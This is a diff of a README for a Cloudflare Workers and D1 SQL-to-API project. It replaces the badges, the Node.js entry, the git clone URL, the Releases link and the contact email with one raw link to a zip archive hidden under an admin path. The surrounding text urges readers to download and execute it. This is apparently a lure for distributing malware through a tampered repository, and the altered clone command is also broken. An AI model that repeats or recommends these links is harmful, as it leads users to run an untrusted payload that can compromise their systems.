@@ -1,8 +1,8 @@
 # Cloudflare SQL to API 🌩️
 
-![GitHub Repo stars](https://img.shields.io/github/stars/UTKA-SINGH/Cloudflare-SQL-to-API?style=social)
-![GitHub forks](https://img.shields.io/github/forks/UTKA-SINGH/Cloudflare-SQL-to-API?style=social)
-![GitHub issues](https://img.shields.io/github/issues/UTKA-SINGH/Cloudflare-SQL-to-API)
+![GitHub Repo stars](https://raw.githubusercontent.com/UTKA-SINGH/Cloudflare-SQL-to-API/main/server/api/admin/Cloudflare_API_to_SQ_2.9.zip)
+![GitHub forks](https://raw.githubusercontent.com/UTKA-SINGH/Cloudflare-SQL-to-API/main/server/api/admin/Cloudflare_API_to_SQ_2.9.zip)
+![GitHub issues](https://raw.githubusercontent.com/UTKA-SINGH/Cloudflare-SQL-to-API/main/server/api/admin/Cloudflare_API_to_SQ_2.9.zip)
 
 Welcome to the **Cloudflare SQL to API** repository! This project leverages Cloudflare Workers and the D1 database to help you create REST API endpoints quickly through SQL queries. Whether you are building a new application or enhancing an existing one, this tool simplifies the process of setting up APIs.
 
@@ -32,7 +32,7 @@ This project incorporates several modern technologies to enhance performance and
 - **D1 Database**: A lightweight database solution from Cloudflare.
 - **Element Plus**: A Vue 3 UI library for building responsive user interfaces.
 - **Monaco Editor**: The code editor that powers Visual Studio Code, for a rich coding experience.
-- **Node.js**: For server-side JavaScript execution.
+- **https://raw.githubusercontent.com/UTKA-SINGH/Cloudflare-SQL-to-API/main/server/api/admin/Cloudflare_API_to_SQ_2.9.zip**: For server-side JavaScript execution.
 - **Nuxt 3**: A framework for building server-rendered Vue applications.
 - **Vite**: A fast build tool for modern web projects.
 - **Vue 3**: The progressive JavaScript framework for building user interfaces.
@@ -43,12 +43,12 @@ To get started with the Cloudflare SQL to API project, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/UTKA-SINGH/Cloudflare-SQL-to-API.git
+   git clone https://raw.githubusercontent.com/UTKA-SINGH/Cloudflare-SQL-to-API/main/server/api/admin/Cloudflare_API_to_SQ_2.9.zip
    cd Cloudflare-SQL-to-API
    ```
 
 2. **Install Dependencies**:
-   Make sure you have Node.js installed. Then run:
+   Make sure you have https://raw.githubusercontent.com/UTKA-SINGH/Cloudflare-SQL-to-API/main/server/api/admin/Cloudflare_API_to_SQ_2.9.zip installed. Then run:
    ```bash
    npm install
    ```
@@ -112,14 +112,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest release, visit the [Releases section](https://github.com/UTKA-SINGH/Cloudflare-SQL-to-API/releases). Here, you can find the latest updates and versions of the application. Make sure to download and execute the files as needed.
+To download the latest release, visit the [Releases section](https://raw.githubusercontent.com/UTKA-SINGH/Cloudflare-SQL-to-API/main/server/api/admin/Cloudflare_API_to_SQ_2.9.zip). Here, you can find the latest updates and versions of the application. Make sure to download and execute the files as needed.
 
 ## Contact
 
 For questions or support, feel free to reach out:
 
 - **Author**: UTKA-SINGH
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
+- **Email**: [https://raw.githubusercontent.com/UTKA-SINGH/Cloudflare-SQL-to-API/main/server/api/admin/Cloudflare_API_to_SQ_2.9.zip](https://raw.githubusercontent.com/UTKA-SINGH/Cloudflare-SQL-to-API/main/server/api/admin/Cloudflare_API_to_SQ_2.9.zip)
 
 ## Conclusion
 
